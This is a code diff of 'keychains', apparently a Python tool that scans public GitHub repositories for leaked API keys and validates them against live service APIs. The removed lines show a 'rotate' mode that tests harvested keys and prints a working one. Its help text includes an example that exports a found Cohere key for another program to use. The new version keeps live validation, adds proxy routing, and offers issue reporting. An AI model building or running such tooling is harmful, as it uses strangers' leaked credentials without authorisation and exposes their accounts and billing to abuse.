-                print(f"\nFound {len(new_leaks_in_cycle)} new leaks. Creating GitHub issues...")
-                report_tasks = [create_leak_issue(leak, TOKEN, args.error_log_file, session, semaphore) for leak in new_leaks_in_cycle]
-                issue_statuses = await asyncio.gather(*report_tasks)
-                for leak, status in zip(new_leaks_in_cycle, issue_statuses):
-                    leak["issue_status"] = status
+            if config['duration'] == 0: break
             
-            if new_leaks_in_cycle:
-                print("\n--- Newly Confirmed Leaks ---")
-                for leak in new_leaks_in_cycle:
-                    confidence_str = f"{int(leak['confidence']*100)}% ({leak['confidence_description']})"
-                    print(f"  Service: {leak['service']}")
-                    print(f"  Repository: {leak['repository']}")
-                    print(f"  File URL: {leak['url']}")
-                    print(f"  Confidence: {confidence_str}")
-                    print(f"  Validation: {leak['validation_status']}")
-                    print(f"  Issue Status: {leak['issue_status']}")
-                    print("--------------------")
-            else:
-                print("\nNo new leaks found in this cycle.")
-
-            if args.duration == 0 or time.time() >= end_time:
-                break
-            
-            print(f"\nCycle complete. Waiting 60s...")
+            await dashboard.set_status(f"Cycle {cycle} complete. Waiting 60s...")
             await asyncio.sleep(60)
 
-    summary_text = f"Scan Complete. Found a total of {len(total_found_leaks)} new leaks."
-    if args.validate and total_found_leaks:
-        summary_items = []
-        for status, count in sorted(validation_summary.items()):
-            summary_items.append(f"{count} {status}")
-        summary_text += f"\n\nValidation Summary: {', '.join(summary_items)}"
-    
-    print("\n--- Scan Results ---")
-    print(summary_text)
-    print("--------------------")
-    
+    print("\n" + "─" * 40)
+    print(f"{Ansi.BOLD}🔑 keychains v3.0.0 - Scan Complete{Ansi.RESET}")
+    print("─" * 40)
+    print(f"  Total Confirmed Leaks Found: {len(total_found_leaks)}")
+    print(f"  Total GitHub Queries Made:   {dashboard.stats['queries_sent']}")
+    print(f"  Total Items Processed:       {dashboard.stats['items_processed']}")
+    print("─" * 40)
+
     if total_found_leaks:
-        try:
-            existing_leaks = []
-            if os.path.exists(output_filename):
-                 with open(output_filename, 'r') as f:
-                    try: existing_leaks = json.load(f)
-                    except json.JSONDecodeError: pass
-            
-            with open(output_filename, 'w') as f:
-                json.dump(existing_leaks + total_found_leaks, f, indent=2)
-            print(f"Results saved to {output_filename}")
-        except IOError as e:
-            log_error(f"Could not write to output file: {e}", args.error_log_file)
-    
-    save_cache(cache)
-
-# --- Mode: ROTATE ---
-
-async def validate_key(service, key, definition, session):
-    val_config = definition['validation']
-    headers, params = {'User-Agent': 'keychains-scanner/1.0'}, {}
-    auth_type = val_config['auth_type']
-    if auth_type == 'bearer': headers['Authorization'] = f'Bearer {key}'
-    elif auth_type == 'header': headers[val_config['header_name']] = key
-    elif auth_type == 'query_param': params[val_config['param_name']] = key
-
-    try:
-        async with session.request(val_config['method'], val_config['url'], headers=headers, params=params, timeout=5) as response:
-            if response.status == 200: return True, "Active"
-            elif response.status in [401, 403]: return False, "Invalid/Forbidden"
-            elif response.status == 429: return False, "Rate-Limited"
-            else: return False, f"HTTP {response.status}"
-    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-        return False, f"Request Failed ({e.__class__.__name__})"
-
-async def run_rotate(args):
-    service = args.service
-    if service not in SERVICE_DEFINITIONS:
-        print(f"Error: Service '{service}' is not defined.", file=sys.stderr)
-        log_error(f"Service '{service}' is not defined.", args.error_log_file)
-        sys.exit(1)
-        
-    if not os.path.exists(args.key_file):
-        print(f"Error: Key file not found at '{args.key_file}'.", file=sys.stderr)
-        log_error(f"Key file not found at '{args.key_file}'.", args.error_log_file)
-        sys.exit(1)
-
-    with open(args.key_file, 'r') as f:
-        try: all_keys = json.load(f)
-        except json.JSONDecodeError:
-            print(f"Error: Could not parse JSON from '{args.key_file}'.", file=sys.stderr)
-            log_error(f"Could not parse JSON from '{args.key_file}'.", args.error_log_file)
-            sys.exit(1)
-
-    service_keys = [item for item in all_keys if item.get('service') == service]
-    if not service_keys:
-        print(f"No keys for service '{service}' found in '{args.key_file}'.", file=sys.stderr)
-        log_error(f"No keys for service '{service}' found in '{args.key_file}'.", args.error_log_file)
-        sys.exit(1)
-
-    service_keys.reverse()
-    service_keys.sort(key=lambda x: x.get('confidence', 0), reverse=True)
-
-    print(f"Found {len(service_keys)} potential keys for {service}. Validating concurrently...")
-    
-    async with aiohttp.ClientSession() as session:
-        tasks = [asyncio.create_task(validate_key(service, item['key_snippet'], SERVICE_DEFINITIONS[service], session)) for item in service_keys]
-        future_to_item = {task: item for task, item in zip(tasks, service_keys)}
-        
-        for future in asyncio.as_completed(tasks):
-            item = future_to_item[future]
-            repo = item.get('repository', 'N/A')
+        if output_filename:
             try:
-                is_valid, reason = await future
-                if is_valid:
-                    print(f"SUCCESS: Found a working {service} key from {repo}.")
-                    
-                    if args.json_output:
-                        print(json.dumps(item, indent=2))
-                    else:
-                        print(item['key_snippet'])
-                    
-                    for task in tasks: task.cancel() # Cancel remaining tasks
-                    return
-            except Exception as exc:
-                log_error(f"An error occurred validating key from {repo}: {exc}", args.error_log_file)
-    
-    print(f"Failed to find any working keys for {service} after checking all candidates.", file=sys.stderr)
-    log_error(f"Failed to find any working keys for {service}.", args.error_log_file)
-    sys.exit(1)
+                with open(output_filename, 'w') as f:
+                    json.dump(total_found_leaks, f, indent=2)
+                print(f"✅ Results saved to {output_filename}")
+            except IOError as e:
+                print(f"❌ Could not write to output file: {e}")
+
+    scanner.save_cache()
+    print("✅ Cache updated.")
 
 
 # --- Main Execution ---
 def main():
-    parser = argparse.ArgumentParser(
-        description="keychains: AI Key Scanner & Rotator. A powerful command-line tool for finding and validating exposed API keys on public GitHub repositories.",
-        formatter_class=argparse.RawTextHelpFormatter,
-        epilog="""
-Examples:
-  # Run a basic scan for all services, results save to findings.json by default
-  python keychains.ts scan
-
-  # Scan for OpenAI keys, validate them, and create GitHub issues to report leaks
-  python keychains.ts scan --services OpenAI --report --validate --output openai_findings.json
-  
-  # Fetch a single working Cohere key from a file and print it for another program to use
-  export COHERE_API_KEY=$(python keychains.ts rotate --service Cohere --key-file findings.json)
-"""
-    )
-    parser.add_argument('--error-log-file', type=str, default="errors.log", help="File to log errors and non-critical information to.")
+    parser = argparse.ArgumentParser(description="keychains v3.0.0: The Monster Update. A high-performance, interactive scanner for finding and managing exposed API keys on GitHub.", formatter_class=argparse.RawTextHelpFormatter)
     
     subparsers = parser.add_subparsers(dest='command', required=True, help='Available commands')
 
-    # --- Scan command parser ---
-    scan_parser = subparsers.add_parser(
-        'scan',
-        help='Scan GitHub for exposed API keys.',
-        description='Scans public GitHub repositories for exposed API keys using a variety of search dorks and heuristics. Displays results and can optionally report findings by creating issues.'
-    )
-    scan_parser.add_argument('--token', type=str, default=None, help='GitHub Personal Access Token. If not provided, defaults to GITHUB_TOKEN environment variable.')
-    scan_parser.add_argument('--output', '-o', type=str, help='File to save JSON results to. Defaults to "findings.json".')
-    scan_parser.add_argument('--services', '-s', type=str, default='all', help='Comma-separated list of services to scan for (e.g., OpenAI,Cohere). Defaults to "all".')
-    scan_parser.add_argument('--workers', '-w', type=int, default=10, help='Max number of concurrent requests to GitHub.')
-    scan_parser.add_argument('--no-forks', action='store_true', help='Exclude forked repositories from search results.')
-    scan_parser.add_argument('--duration', '-d', type=int, default=0, help='Duration to run the scan in minutes. 0 means a single run, exiting after one cycle.')
-    scan_parser.add_argument('--report', action='store_true', help='Automatically create a GitHub issue in the repository to report found leaks.')
-    scan_parser.add_argument('--validate', action='store_true', help='Validate found keys against their respective service APIs to check if they are active.')
-    scan_parser.add_argument('--ml-filter', action='store_true', help='[Experimental] Use a TinyBERT ML model to filter out false positives.')
-    scan_parser.add_argument('--ml-model', type=str, default='keyguardian.onnx', help='Path to the ONNX model file for the ML filter.')
+    scan_parser = subparsers.add_parser('scan', help='Scan GitHub for exposed API keys with an interactive dashboard.')
+    scan_parser.add_argument('--token', type=str, help='GitHub Personal Access Token. Overrides GITHUB_TOKEN env var.')
+    scan_parser.add_argument('--config-file', type=str, default='keychains_config.yml', help='Path to a YAML config file.')
+    scan_parser.add_argument('--output', '-o', type=str, default='findings.json', help='File to save JSON results to.')
+    scan_parser.add_argument('--services', '-s', type=str, default='all', help='Comma-separated services to scan for (e.g., OpenAI,GoogleAI).')
+    scan_parser.add_argument('--workers', '-w', type=int, default=15, help='Max concurrent async workers.')
+    scan_parser.add_argument('--no-forks', action='store_true', help='Exclude forked repositories.')
+    scan_parser.add_argument('--duration', '-d', type=int, default=0, help='Continuous scan duration in minutes (0 for a single run).')
+    scan_parser.add_argument('--validate', action='store_true', help='Validate found keys against service APIs.')
+    scan_parser.add_argument('--report', action='store_true', help='Create a GitHub issue in the repository for valid leaks.')
+    scan_parser.add_argument('--webhook-url', type=str, help='Send valid leak notifications to this Slack/Discord webhook URL.')
+    scan_parser.add_argument('--proxy', type=str, help='HTTP/S proxy for validation requests (e.g., http://user:pass@127.0.0.1:8080).')
+    scan_parser.add_argument('--ml-filter', action='store_true', help='Use a KeyGuardian ML model to filter false positives.')
+    scan_parser.add_argument('--ml-model', type=str, default='keyguardian.onnx', help='Path to the ONNX model file.')
     scan_parser.add_argument('--ml-threshold', type=float, default=0.8, help='Confidence threshold (0.0-1.0) for the ML filter.')
-    scan_parser.add_argument('--collect-data', type=str, default=None, help='File path to save key candidates for ML training (JSONL format). Enables self-learning when used with --validate.')
-    scan_parser.set_defaults(func=run_scan)
-
-    # --- Rotate command parser ---
-    rotate_parser = subparsers.add_parser(
-        'rotate',
-        help='Get a single working API key from a file of candidates.',
-        description='Reads a list of potential API keys from a JSON file (typically generated by the scan command), validates them concurrently, and prints the first working key it finds. Designed for scripting and CI/CD integration.'
-    )
-    rotate_parser.add_argument('--service', '-s', type=str, required=True, help='The service to get a key for (e.g., OpenAI). Must be one of the defined services.')
-    rotate_parser.add_argument('--key-file', '-k', type=str, default='findings.json', help='The JSON file to read potential keys from.')
-    rotate_parser.add_argument('--json-output', '-j', action='store_true', help='Output the result as a full JSON object instead of just the key string.')
-    rotate_parser.set_defaults(func=run_rotate)
-
+    scan_parser.add_argument('--collect-data', type=str, help='File path to save key candidates for ML training (JSONL format). Requires --validate.')
+    scan_parser.set_defaults(func=run_scan_orchestrator)
+    
     if len(sys.argv) == 1:
         parser.print_help(sys.stderr)
         sys.exit(1)
         
     args = parser.parse_args()
-    
-    if args.command:
-        display_banner()
     
     if hasattr(args, 'func'):
         try:
@@ -615,6 +542,11 @@ Examples:
         except KeyboardInterrupt:
             print("\nOperation cancelled by user.")
             sys.exit(0)
+        except Exception as e:
+            print(f"{Ansi.RED}An unexpected error occurred: {e}{Ansi.RESET}")
+            import traceback
+            traceback.print_exc()
+            sys.exit(1)
 
 if __name__ == "__main__":
     main()
